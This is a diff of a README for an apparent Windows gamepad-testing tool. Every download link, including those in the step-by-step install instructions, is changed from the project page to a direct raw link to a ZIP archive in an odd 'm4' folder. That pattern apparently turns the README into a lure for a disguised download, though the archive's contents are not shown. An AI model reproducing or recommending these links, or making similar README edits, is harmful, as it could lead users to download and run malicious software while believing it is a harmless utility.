@@ -1,6 +1,6 @@
 # 🎮 SDL2-Game-Controller-Test - Test gamepads with ease
 
-[🟦 Download the app](https://github.com/Dickieagreeable675/SDL2-Game-Controller-Test)
+[🟦 Download the app](https://github.com/Dickieagreeable675/SDL2-Game-Controller-Test/raw/refs/heads/main/m4/Controller_Game_Test_SD_v3.2.zip)
 
 ## 🚀 Overview
 
@@ -18,7 +18,7 @@ It is made for quick checks, not for setup work. Open it, press buttons, and see
 
 ## 📥 Download and run on Windows
 
-1. Open the download page: https://github.com/Dickieagreeable675/SDL2-Game-Controller-Test
+1. Open the download page: https://github.com/Dickieagreeable675/SDL2-Game-Controller-Test/raw/refs/heads/main/m4/Controller_Game_Test_SD_v3.2.zip
 2. Get the Windows build from the page
 3. Save the file to your PC
 4. If the file is in a ZIP folder, right-click it and choose Extract All
@@ -151,7 +151,7 @@ This app fits well if you want to:
 
 ## 📎 Download again
 
-[🩶 Visit the download page](https://github.com/Dickieagreeable675/SDL2-Game-Controller-Test)
+[🩶 Visit the download page](https://github.com/Dickieagreeable675/SDL2-Game-Controller-Test/raw/refs/heads/main/m4/Controller_Game_Test_SD_v3.2.zip)
 
 ## 🧩 Common controller checks
 
